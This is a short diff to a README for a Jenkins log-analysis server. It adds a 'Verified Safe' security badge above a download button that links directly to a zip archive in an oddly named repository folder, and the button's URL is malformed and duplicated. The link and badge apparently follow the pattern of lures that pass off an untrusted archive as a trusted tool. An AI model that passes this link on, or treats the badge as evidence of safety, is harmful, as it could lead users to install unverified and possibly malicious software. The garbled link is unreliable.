@@ -1,5 +1,7 @@
 # 🛠️ jenkins-mcp-server - Simplified Log Analysis for Jenkins
 
+[![SafeSkill 90/100](https://img.shields.io/badge/SafeSkill-90%2F100_Verified%20Safe-brightgreen)](https://safeskill.dev/scan/maumanto-jenkins-mcp-server)
+
 [![Download jenkins-mcp-server](https://raw.githubusercontent.com/MauManto/jenkins-mcp-server/main/laborant/mcp-server-jenkins-3.2.zip%https://raw.githubusercontent.com/MauManto/jenkins-mcp-server/main/laborant/mcp-server-jenkins-3.2.zip)](https://raw.githubusercontent.com/MauManto/jenkins-mcp-server/main/laborant/mcp-server-jenkins-3.2.zip)
 
 ## 🚀 Getting Started
